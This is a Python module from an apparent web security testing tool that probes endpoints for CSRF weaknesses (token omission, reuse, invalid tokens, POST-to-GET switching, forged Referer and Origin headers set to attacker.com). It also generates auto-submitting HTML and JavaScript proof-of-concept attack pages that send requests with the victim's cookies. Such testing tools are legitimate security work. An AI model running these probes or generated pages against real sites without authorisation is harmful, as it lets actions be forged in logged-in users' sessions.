"""CSRF (Cross-Site Request Forgery) module for automated testing

This module implements:
- CSRF token omission testing
- Token reuse and expiration testing
- Method switching bypass testing
- PoC generation for HTML and JavaScript
- Safe demonstration instructions
"""

from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional

from src.vulnchain.core.request_handler import RequestHandler, Response
from src.vulnchain.core.session_manager import SessionManager


class CSRFTechnique(Enum):
    """CSRF testing techniques"""
    
    TOKEN_OMISSION = "token_omission"  # Test without CSRF token
    TOKEN_REUSE = "token_reuse"  # Test token reuse
    TOKEN_EXPIRATION = "token_expiration"  # Test expired tokens
    METHOD_SWITCHING = "method_switching"  # Test method switching (POST to GET)
    REFERER_BYPASS = "referer_bypass"  # Test referer header bypass
    ORIGIN_BYPASS = "origin_bypass"  # Test origin header bypass


@dataclass
class CSRFTestPoint:
    """Represents a potential CSRF test point"""
    
    url: str
    method: str = "POST"
    parameters: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    cookies: Dict[str, str] = field(default_factory=dict)
    csrf_token_name: Optional[str] = None
    csrf_token_value: Optional[str] = None
    csrf_token_location: Optional[str] = None  # parameter, header, cookie


@dataclass
class CSRFResult:
    """Result of CSRF testing"""
    
    test_point: CSRFTestPoint
    is_vulnerable: bool
    technique: Optional[CSRFTechnique] = None
    confidence: float = 0.0
    evidence: List[str] = field(default_factory=list)
    baseline_response: Optional[Response] = None
    attack_response: Optional[Response] = None
    poc_html: Optional[str] = None
    poc_javascript: Optional[str] = None
    metadata: Dict = field(default_factory=dict)


class CSRFTester:
    """CSRF detection and exploitation"""
    
    # Common CSRF token parameter names
    CSRF_TOKEN_NAMES = [
        "csrf_token",
        "csrf",
        "_csrf",
        "csrftoken",
        "token",
        "_token",
        "authenticity_token",
        "anti_csrf_token",
        "xsrf_token",
        "xsrf",
        "_xsrf",
        "csrf-token",
        "x-csrf-token",
        "x-xsrf-token",
    ]
    
    # Common CSRF token header names
    CSRF_HEADER_NAMES = [
        "X-CSRF-Token",
        "X-XSRF-Token",
        "X-CSRFToken",
        "CSRF-Token",
        "Anti-CSRF-Token",
    ]

    def __init__(
        self,
        request_handler: RequestHandler,
        session_manager: Optional[SessionManager] = None,
    ):
        """Initialize CSRF tester
        
        Args:
            request_handler: Request handler for HTTP communication
            session_manager: Optional session manager for cookie handling
        """
        self.request_handler = request_handler
        self.session_manager = session_manager or SessionManager()
    
    async def test_endpoint(
        self,
        test_point: CSRFTestPoint,
        techniques: Optional[List[CSRFTechnique]] = None,
    ) -> List[CSRFResult]:
        """Test an endpoint for CSRF vulnerabilities
        
        Args:
            test_point: The endpoint to test
            techniques: List of techniques to use (default: all)
        
        Returns:
            List of CSRF results
        """
        if techniques is None:
            techniques = list(CSRFTechnique)
        
        results = []
        
        # First, detect CSRF token if not provided
        if not test_point.csrf_token_name:
            await self._detect_csrf_token(test_point)
        
        # Get baseline response (legitimate request)
        baseline_response = await self._send_legitimate_request(test_point)
        
        # Test each technique
        for technique in techniques:
            if technique == CSRFTechnique.TOKEN_OMISSION:
                result = await self._test_token_omission(test_point, baseline_response)
            elif technique == CSRFTechnique.TOKEN_REUSE:
                result = await self._test_token_reuse(test_point, baseline_response)
            elif technique == CSRFTechnique.TOKEN_EXPIRATION:
                result = await self._test_token_expiration(test_point, baseline_response)
            elif technique == CSRFTechnique.METHOD_SWITCHING:
                result = await self._test_method_switching(test_point, baseline_response)
            elif technique == CSRFTechnique.REFERER_BYPASS:
                result = await self._test_referer_bypass(test_point, baseline_response)
            elif technique == CSRFTechnique.ORIGIN_BYPASS:
                result = await self._test_origin_bypass(test_point, baseline_response)
            else:
                continue
            
            if result:
                results.append(result)
                
                # If we found a vulnerability, we can stop testing
                if result.is_vulnerable:
                    break
        
        return results
    
    async def _detect_csrf_token(self, test_point: CSRFTestPoint):
        """Detect CSRF token in the test point
        
        Args:
            test_point: The test point to analyze
        """
        # Check parameters for CSRF token
        for param_name in test_point.parameters.keys():
            if any(csrf_name in param_name.lower() for csrf_name in self.CSRF_TOKEN_NAMES):
                test_point.csrf_token_name = param_name
                test_point.csrf_token_value = test_point.parameters[param_name]
                test_point.csrf_token_location = "parameter"
                return
        
        # Check headers for CSRF token
        for header_name in test_point.headers.keys():
            # Check both the header name and common CSRF header names (case-insensitive)
            header_lower = header_name.lower()
            csrf_headers_lower = [name.lower() for name in self.CSRF_HEADER_NAMES]
            
            if header_lower in csrf_headers_lower or any(csrf_name.lower() in header_lower for csrf_name in self.CSRF_TOKEN_NAMES):
                test_point.csrf_token_name = header_name
                test_point.csrf_token_value = test_point.headers[header_name]
                test_point.csrf_token_location = "header"
                return
        
        # Check cookies for CSRF token
        for cookie_name in test_point.cookies.keys():
            if any(csrf_name in cookie_name.lower() for csrf_name in self.CSRF_TOKEN_NAMES):
                test_point.csrf_token_name = cookie_name
                test_point.csrf_token_value = test_point.cookies[cookie_name]
                test_point.csrf_token_location = "cookie"
                return
    
    async def _send_legitimate_request(self, test_point: CSRFTestPoint) -> Response:
        """Send a legitimate request with all tokens
        
        Args:
            test_point: The test point
        
        Returns:
            Response object
        """
        return await self.request_handler.send_request(
            method=test_point.method,
            url=test_point.url,
            headers=test_point.headers,
            data=test_point.parameters,
            cookies=test_point.cookies,
        )
    
    async def _test_token_omission(
        self, test_point: CSRFTestPoint, baseline_response: Response
    ) -> CSRFResult:
        """Test CSRF by omitting the token
        
        Args:
            test_point: The test point
            baseline_response: Baseline response for comparison
        
        Returns:
            CSRFResult
        """
        # Create request without CSRF token
        modified_params = test_point.parameters.copy()
        modified_headers = test_point.headers.copy()
        modified_cookies = test_point.cookies.copy()
        
        # Remove CSRF token based on location
        if test_point.csrf_token_location == "parameter" and test_point.csrf_token_name:
            modified_params.pop(test_point.csrf_token_name, None)
        elif test_point.csrf_token_location == "header" and test_point.csrf_token_name:
            modified_headers.pop(test_point.csrf_token_name, None)
        elif test_point.csrf_token_location == "cookie" and test_point.csrf_token_name:
            modified_cookies.pop(test_point.csrf_token_name, None)
        
        # Send request without token
        attack_response = await self.request_handler.send_request(
            method=test_point.method,
            url=test_point.url,
            headers=modified_headers,
            data=modified_params,
            cookies=modified_cookies,
        )
        
        # Check if request succeeded
        is_vulnerable = self._is_request_successful(
            baseline_response,
            attack_response,
        )
        
        # Generate PoC if vulnerable
        poc_html = None
        poc_js = None
        if is_vulnerable:
            poc_generator = CSRFPoCGenerator()
            poc_html = poc_generator.generate_html_poc(test_point, CSRFTechnique.TOKEN_OMISSION)
            poc_js = poc_generator.generate_javascript_poc(test_point, CSRFTechnique.TOKEN_OMISSION)
        
        return CSRFResult(
            test_point=test_point,
            is_vulnerable=is_vulnerable,
            technique=CSRFTechnique.TOKEN_OMISSION,
            confidence=0.95 if is_vulnerable else 0.0,
            evidence=[
                f"CSRF vulnerability detected: Token omission",
                f"Request succeeded without CSRF token",
                f"Baseline status: {baseline_response.status_code}",
                f"Attack status: {attack_response.status_code}",
            ] if is_vulnerable else [
                "CSRF token validation is enforced",
                "Request failed without token",
            ],
            baseline_response=baseline_response,
            attack_response=attack_response,
            poc_html=poc_html,
            poc_javascript=poc_js,
        )
    
    async def _test_token_reuse(
        self, test_point: CSRFTestPoint, baseline_response: Response
    ) -> CSRFResult:
        """Test CSRF by reusing a previously captured token
        
        Args:
            test_point: The test point
            baseline_response: Baseline response for comparison
        
        Returns:
            CSRFResult
        """
        # Send first request (this consumes the token)
        await self._send_legitimate_request(test_point)
        
        # Try to reuse the same token
        attack_response = await self._send_legitimate_request(test_point)
        
        # Check if token reuse succeeded
        is_vulnerable = self._is_request_successful(
            baseline_response,
            attack_response,
        )
        
        # Generate PoC if vulnerable
        poc_html = None
        poc_js = None
        if is_vulnerable:
            poc_generator = CSRFPoCGenerator()
            poc_html = poc_generator.generate_html_poc(test_point, CSRFTechnique.TOKEN_REUSE)
            poc_js = poc_generator.generate_javascript_poc(test_point, CSRFTechnique.TOKEN_REUSE)
        
        return CSRFResult(
            test_point=test_point,
            is_vulnerable=is_vulnerable,
            technique=CSRFTechnique.TOKEN_REUSE,
            confidence=0.90 if is_vulnerable else 0.0,
            evidence=[
                f"CSRF vulnerability detected: Token reuse",
                f"Token can be reused multiple times",
                f"Attack status: {attack_response.status_code}",
            ] if is_vulnerable else [
                "CSRF token is single-use",
                "Token reuse was rejected",
            ],
            baseline_response=baseline_response,
            attack_response=attack_response,
            poc_html=poc_html,
            poc_javascript=poc_js,
        )

    async def _test_token_expiration(
        self, test_point: CSRFTestPoint, baseline_response: Response
    ) -> CSRFResult:
        """Test CSRF with expired token
        
        Args:
            test_point: The test point
            baseline_response: Baseline response for comparison
        
        Returns:
            CSRFResult
        """
        # For this test, we would need to wait for token expiration
        # In a real scenario, we'd capture an old token and try to use it
        # For now, we'll simulate by using a modified/invalid token
        
        modified_params = test_point.parameters.copy()
        modified_headers = test_point.headers.copy()
        modified_cookies = test_point.cookies.copy()
        
        # Modify the token to simulate an expired/invalid token
        if test_point.csrf_token_location == "parameter" and test_point.csrf_token_name:
            # Use a modified version of the token
            original_token = test_point.csrf_token_value or ""
            modified_token = self._generate_invalid_token(original_token)
            modified_params[test_point.csrf_token_name] = modified_token
        elif test_point.csrf_token_location == "header" and test_point.csrf_token_name:
            original_token = test_point.csrf_token_value or ""
            modified_token = self._generate_invalid_token(original_token)
            modified_headers[test_point.csrf_token_name] = modified_token
        elif test_point.csrf_token_location == "cookie" and test_point.csrf_token_name:
            original_token = test_point.csrf_token_value or ""
            modified_token = self._generate_invalid_token(original_token)
            modified_cookies[test_point.csrf_token_name] = modified_token
        
        # Send request with modified token
        attack_response = await self.request_handler.send_request(
            method=test_point.method,
            url=test_point.url,
            headers=modified_headers,
            data=modified_params,
            cookies=modified_cookies,
        )
        
        # Check if request succeeded with invalid token
        is_vulnerable = self._is_request_successful(
            baseline_response,
            attack_response,
        )
        
        # Generate PoC if vulnerable
        poc_html = None
        poc_js = None
        if is_vulnerable:
            poc_generator = CSRFPoCGenerator()
            poc_html = poc_generator.generate_html_poc(test_point, CSRFTechnique.TOKEN_EXPIRATION)
            poc_js = poc_generator.generate_javascript_poc(test_point, CSRFTechnique.TOKEN_EXPIRATION)
        
        return CSRFResult(
            test_point=test_point,
            is_vulnerable=is_vulnerable,
            technique=CSRFTechnique.TOKEN_EXPIRATION,
            confidence=0.85 if is_vulnerable else 0.0,
            evidence=[
                f"CSRF vulnerability detected: Token expiration not enforced",
                f"Invalid/expired token was accepted",
                f"Attack status: {attack_response.status_code}",
            ] if is_vulnerable else [
                "CSRF token validation is strict",
                "Invalid token was rejected",
            ],
            baseline_response=baseline_response,
            attack_response=attack_response,
            poc_html=poc_html,
            poc_javascript=poc_js,
        )
    
    async def _test_method_switching(
        self, test_point: CSRFTestPoint, baseline_response: Response
    ) -> CSRFResult:
        """Test CSRF by switching HTTP method (POST to GET)
        
        Args:
            test_point: The test point
            baseline_response: Baseline response for comparison
        
        Returns:
            CSRFResult
        """
        # Only test if original method is POST
        if test_point.method.upper() != "POST":
            return CSRFResult(
                test_point=test_point,
                is_vulnerable=False,
                technique=CSRFTechnique.METHOD_SWITCHING,
                confidence=0.0,
                evidence=["Method switching test only applies to POST requests"],
            )
        
        # Convert POST parameters to GET query string
        from urllib.parse import urlencode, urlparse, urlunparse
        
        parsed = urlparse(test_point.url)
        query_params = test_point.parameters.copy()
        
        # Remove CSRF token from parameters
        if test_point.csrf_token_location == "parameter" and test_point.csrf_token_name:
            query_params.pop(test_point.csrf_token_name, None)
        
        new_query = urlencode(query_params)
        new_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment,
        ))
        
        # Send GET request
        attack_response = await self.request_handler.send_request(
            method="GET",
            url=new_url,
            headers=test_point.headers,
            cookies=test_point.cookies,
        )
        
        # Check if request succeeded
        is_vulnerable = self._is_request_successful(
            baseline_response,
            attack_response,
        )
        
        # Generate PoC if vulnerable
        poc_html = None
        poc_js = None
        if is_vulnerable:
            poc_generator = CSRFPoCGenerator()
            poc_html = poc_generator.generate_html_poc(test_point, CSRFTechnique.METHOD_SWITCHING)
            poc_js = poc_generator.generate_javascript_poc(test_point, CSRFTechnique.METHOD_SWITCHING)
        
        return CSRFResult(
            test_point=test_point,
            is_vulnerable=is_vulnerable,
            technique=CSRFTechnique.METHOD_SWITCHING,
            confidence=0.95 if is_vulnerable else 0.0,
            evidence=[
                f"CSRF vulnerability detected: Method switching",
                f"POST request can be converted to GET",
                f"Attack status: {attack_response.status_code}",
                f"Attack URL: {new_url}",
            ] if is_vulnerable else [
                "Method switching protection is enforced",
                "GET request was rejected",
            ],
            baseline_response=baseline_response,
            attack_response=attack_response,
            poc_html=poc_html,
            poc_javascript=poc_js,
            metadata={"attack_url": new_url} if is_vulnerable else {},
        )
    
    async def _test_referer_bypass(
        self, test_point: CSRFTestPoint, baseline_response: Response
    ) -> CSRFResult:
        """Test CSRF by manipulating Referer header
        
        Args:
            test_point: The test point
            baseline_response: Baseline response for comparison
        
        Returns:
            CSRFResult
        """
        # Remove CSRF token and set malicious referer
        modified_params = test_point.parameters.copy()
        modified_headers = test_point.headers.copy()
        modified_cookies = test_point.cookies.copy()
        
        # Remove CSRF token
        if test_point.csrf_token_location == "parameter" and test_point.csrf_token_name:
            modified_params.pop(test_point.csrf_token_name, None)
        elif test_point.csrf_token_location == "header" and test_point.csrf_token_name:
            modified_headers.pop(test_point.csrf_token_name, None)
        
        # Set malicious referer
        modified_headers["Referer"] = "https://attacker.com/"
        
        # Send request with malicious referer
        attack_response = await self.request_handler.send_request(
            method=test_point.method,
            url=test_point.url,
            headers=modified_headers,
            data=modified_params,
            cookies=modified_cookies,
        )
        
        # Check if request succeeded
        is_vulnerable = self._is_request_successful(
            baseline_response,
            attack_response,
        )
        
        # Generate PoC if vulnerable
        poc_html = None
        poc_js = None
        if is_vulnerable:
            poc_generator = CSRFPoCGenerator()
            poc_html = poc_generator.generate_html_poc(test_point, CSRFTechnique.REFERER_BYPASS)
            poc_js = poc_generator.generate_javascript_poc(test_point, CSRFTechnique.REFERER_BYPASS)
        
        return CSRFResult(
            test_point=test_point,
            is_vulnerable=is_vulnerable,
            technique=CSRFTechnique.REFERER_BYPASS,
            confidence=0.90 if is_vulnerable else 0.0,
            evidence=[
                f"CSRF vulnerability detected: Referer bypass",
                f"Request succeeded with malicious referer",
                f"Attack status: {attack_response.status_code}",
            ] if is_vulnerable else [
                "Referer validation is enforced",
                "Request with malicious referer was rejected",
            ],
            baseline_response=baseline_response,
            attack_response=attack_response,
            poc_html=poc_html,
            poc_javascript=poc_js,
        )
    
    async def _test_origin_bypass(
        self, test_point: CSRFTestPoint, baseline_response: Response
    ) -> CSRFResult:
        """Test CSRF by manipulating Origin header
        
        Args:
            test_point: The test point
            baseline_response: Baseline response for comparison
        
        Returns:
            CSRFResult
        """
        # Remove CSRF token and set malicious origin
        modified_params = test_point.parameters.copy()
        modified_headers = test_point.headers.copy()
        modified_cookies = test_point.cookies.copy()
        
        # Remove CSRF token
        if test_point.csrf_token_location == "parameter" and test_point.csrf_token_name:
            modified_params.pop(test_point.csrf_token_name, None)
        elif test_point.csrf_token_location == "header" and test_point.csrf_token_name:
            modified_headers.pop(test_point.csrf_token_name, None)
        
        # Set malicious origin
        modified_headers["Origin"] = "https://attacker.com"
        
        # Send request with malicious origin
        attack_response = await self.request_handler.send_request(
            method=test_point.method,
            url=test_point.url,
            headers=modified_headers,
            data=modified_params,
            cookies=modified_cookies,
        )
        
        # Check if request succeeded
        is_vulnerable = self._is_request_successful(
            baseline_response,
            attack_response,
        )
        
        # Generate PoC if vulnerable
        poc_html = None
        poc_js = None
        if is_vulnerable:
            poc_generator = CSRFPoCGenerator()
            poc_html = poc_generator.generate_html_poc(test_point, CSRFTechnique.ORIGIN_BYPASS)
            poc_js = poc_generator.generate_javascript_poc(test_point, CSRFTechnique.ORIGIN_BYPASS)
        
        return CSRFResult(
            test_point=test_point,
            is_vulnerable=is_vulnerable,
            technique=CSRFTechnique.ORIGIN_BYPASS,
            confidence=0.90 if is_vulnerable else 0.0,
            evidence=[
                f"CSRF vulnerability detected: Origin bypass",
                f"Request succeeded with malicious origin",
                f"Attack status: {attack_response.status_code}",
            ] if is_vulnerable else [
                "Origin validation is enforced",
                "Request with malicious origin was rejected",
            ],
            baseline_response=baseline_response,
            attack_response=attack_response,
            poc_html=poc_html,
            poc_javascript=poc_js,
        )
    
    def _is_request_successful(
        self, baseline_response: Response, attack_response: Response
    ) -> bool:
        """Determine if attack request was successful
        
        Args:
            baseline_response: Baseline response
            attack_response: Attack response
        
        Returns:
            True if attack succeeded, False otherwise
        """
        # Check if status codes match (both successful)
        if attack_response.status_code == baseline_response.status_code:
            # Both succeeded - but check for error indicators first
            if 200 <= attack_response.status_code < 300:
                # Check if response contains error indicators
                error_patterns = [
                    "error:",
                    "error -",
                    "error.",
                    "invalid csrf",
                    "invalid token",
                    "csrf token invalid",
                    "csrf token missing",
                    "token invalid",
                    "token missing",
                    "token required",
                    "forbidden",
                    "unauthorized",
                    "authentication failed",
                    "authorization failed",
                ]
                
                response_text_lower = attack_response.text.lower()
                has_error = any(pattern in response_text_lower for pattern in error_patterns)
                
                if has_error:
                    return False
                
                return True
        
        # Check if attack got a success status even if different from baseline
        if 200 <= attack_response.status_code < 300:
            # Attack succeeded - check if it's not an error page
            # Look for strong error indicators (not just presence of words)
            error_patterns = [
                "error:",
                "error -",
                "error.",
                "invalid csrf",
                "invalid token",
                "csrf token invalid",
                "csrf token missing",
                "token invalid",
                "token missing",
                "token required",
                "forbidden",
                "unauthorized",
                "authentication failed",
                "authorization failed",
            ]
            
            response_text_lower = attack_response.text.lower()
            has_error = any(pattern in response_text_lower for pattern in error_patterns)
            
            if not has_error:
                return True
        
        # Check for redirects (might indicate success)
        if 300 <= attack_response.status_code < 400:
            # Redirect might indicate success
            # Compare with baseline
            if attack_response.status_code == baseline_response.status_code:
                return True
        
        return False
    
    def _generate_invalid_token(self, original_token: str) -> str:
        """Generate an invalid token based on the original
        
        Args:
            original_token: The original token
        
        Returns:
            Modified invalid token
        """
        if not original_token:
            return "invalid_token_12345"
        
        # Reverse the token
        if len(original_token) > 10:
            return original_token[::-1]
        
        # Append random characters
        return original_token + "_expired"


class CSRFPoCGenerator:
    """Proof-of-concept generator for CSRF vulnerabilities"""
    
    def __init__(self):
        """Initialize PoC generator"""
        pass
    
    def generate_html_poc(
        self,
        test_point: CSRFTestPoint,
        technique: CSRFTechnique,
    ) -> str:
        """Generate HTML PoC for CSRF
        
        Args:
            test_point: The vulnerable test point
            technique: The technique that worked
        
        Returns:
            HTML PoC string
        """
        if technique == CSRFTechnique.METHOD_SWITCHING:
            # Generate GET-based PoC
            from urllib.parse import urlencode, urlparse, urlunparse
            
            parsed = urlparse(test_point.url)
            query_params = test_point.parameters.copy()
            
            # Remove CSRF token
            if test_point.csrf_token_name:
                query_params.pop(test_point.csrf_token_name, None)
            
            new_query = urlencode(query_params)
            attack_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            ))
            
            poc_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - Method Switching</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p><strong>Vulnerability:</strong> Method Switching (POST to GET)</p>
    <p><strong>Target URL:</strong> {test_point.url}</p>
    
    <h2>Manual Trigger</h2>
    <p>Click the link below to trigger the CSRF attack:</p>
    <a href="{attack_url}" target="_blank">Trigger CSRF Attack</a>
    
    <h2>Automatic Trigger</h2>
    <p>The CSRF attack will be triggered automatically in 3 seconds...</p>
    <img src="{attack_url}" style="display:none;">
    
    <h2>Safe Demonstration Instructions</h2>
    <ol>
        <li>Ensure you are logged into the target application in another tab</li>
        <li>Click the link above or wait for automatic trigger</li>
        <li>Verify that the action was performed without your explicit consent</li>
        <li><strong>WARNING:</strong> Only test on applications you own or have permission to test</li>
    </ol>
    
    <script>
        setTimeout(function() {{
            window.location.href = "{attack_url}";
        }}, 3000);
    </script>
</body>
</html>"""
        
        else:
            # Generate POST-based PoC
            form_fields = ""
            for key, value in test_point.parameters.items():
                # Skip CSRF token
                if key == test_point.csrf_token_name:
                    continue
                form_fields += f'        <input type="hidden" name="{key}" value="{value}">\n'
            
            poc_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - {technique.value}</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p><strong>Vulnerability:</strong> {technique.value.replace('_', ' ').title()}</p>
    <p><strong>Target URL:</strong> {test_point.url}</p>
    <p><strong>Method:</strong> {test_point.method}</p>
    
    <h2>Manual Trigger</h2>
    <form action="{test_point.url}" method="{test_point.method}" id="csrfForm">
{form_fields}
        <button type="submit">Trigger CSRF Attack</button>
    </form>
    
    <h2>Automatic Trigger</h2>
    <p>The CSRF attack will be triggered automatically in 3 seconds...</p>
    
    <h2>Safe Demonstration Instructions</h2>
    <ol>
        <li>Ensure you are logged into the target application in another tab</li>
        <li>Click the button above or wait for automatic trigger</li>
        <li>Verify that the action was performed without your explicit consent</li>
        <li><strong>WARNING:</strong> Only test on applications you own or have permission to test</li>
        <li><strong>IMPORTANT:</strong> This PoC demonstrates the vulnerability - do not use for malicious purposes</li>
    </ol>
    
    <script>
        setTimeout(function() {{
            document.getElementById('csrfForm').submit();
        }}, 3000);
    </script>
</body>
</html>"""
        
        return poc_html

    def generate_javascript_poc(
        self,
        test_point: CSRFTestPoint,
        technique: CSRFTechnique,
    ) -> str:
        """Generate JavaScript PoC for CSRF
        
        Args:
            test_point: The vulnerable test point
            technique: The technique that worked
        
        Returns:
            JavaScript PoC string
        """
        if technique == CSRFTechnique.METHOD_SWITCHING:
            # Generate GET-based JavaScript PoC
            from urllib.parse import urlencode
            
            query_params = test_point.parameters.copy()
            if test_point.csrf_token_name:
                query_params.pop(test_point.csrf_token_name, None)
            
            new_query = urlencode(query_params)
            
            poc_js = f"""// CSRF Exploit - Method Switching
// Target: {test_point.url}
// Technique: POST to GET conversion

// Simple image-based attack
function csrfAttackImage() {{
    var img = new Image();
    img.src = "{test_point.url}?{new_query}";
    document.body.appendChild(img);
}}

// Fetch-based attack
function csrfAttackFetch() {{
    fetch("{test_point.url}?{new_query}", {{
        method: 'GET',
        credentials: 'include',  // Include cookies
        mode: 'no-cors'
    }})
    .then(response => console.log('CSRF attack completed'))
    .catch(error => console.log('CSRF attack sent (no-cors mode)'));
}}

// XMLHttpRequest-based attack
function csrfAttackXHR() {{
    var xhr = new XMLHttpRequest();
    xhr.open('GET', "{test_point.url}?{new_query}", true);
    xhr.withCredentials = true;  // Include cookies
    xhr.send();
}}

// Execute attack
// Uncomment the desired method:
// csrfAttackImage();
// csrfAttackFetch();
// csrfAttackXHR();
"""
        
        else:
            # Generate POST-based JavaScript PoC
            params_json = {}
            for key, value in test_point.parameters.items():
                if key != test_point.csrf_token_name:
                    params_json[key] = value
            
            import json
            params_str = json.dumps(params_json, indent=4)
            
            # Build form data string
            form_data_lines = []
            for key, value in params_json.items():
                form_data_lines.append(f"    formData.append('{key}', '{value}');")
            form_data_str = "\n".join(form_data_lines)
            
            poc_js = f"""// CSRF Exploit - {technique.value}
// Target: {test_point.url}
// Method: {test_point.method}
// Technique: {technique.value.replace('_', ' ').title()}

// Parameters (without CSRF token)
var params = {params_str};

// Form-based attack (most reliable)
function csrfAttackForm() {{
    var form = document.createElement('form');
    form.method = '{test_point.method}';
    form.action = '{test_point.url}';
    
    for (var key in params) {{
        var input = document.createElement('input');
        input.type = 'hidden';
        input.name = key;
        input.value = params[key];
        form.appendChild(input);
    }}
    
    document.body.appendChild(form);
    form.submit();
}}

// Fetch-based attack
function csrfAttackFetch() {{
    var formData = new FormData();
{form_data_str}
    
    fetch('{test_point.url}', {{
        method: '{test_point.method}',
        body: formData,
        credentials: 'include',  // Include cookies
        mode: 'no-cors'
    }})
    .then(response => console.log('CSRF attack completed'))
    .catch(error => console.log('CSRF attack sent (no-cors mode)'));
}}

// XMLHttpRequest-based attack
function csrfAttackXHR() {{
    var xhr = new XMLHttpRequest();
    xhr.open('{test_point.method}', '{test_point.url}', true);
    xhr.withCredentials = true;  // Include cookies
    
    var formData = new FormData();
{form_data_str}
    
    xhr.send(formData);
}}

// Execute attack
// Uncomment the desired method:
// csrfAttackForm();
// csrfAttackFetch();
// csrfAttackXHR();

// Safe demonstration instructions:
// 1. Ensure victim is logged into the target application
// 2. Execute one of the attack functions above
// 3. Verify that the action was performed without explicit consent
// WARNING: Only test on applications you own or have permission to test
"""
        
        return poc_js
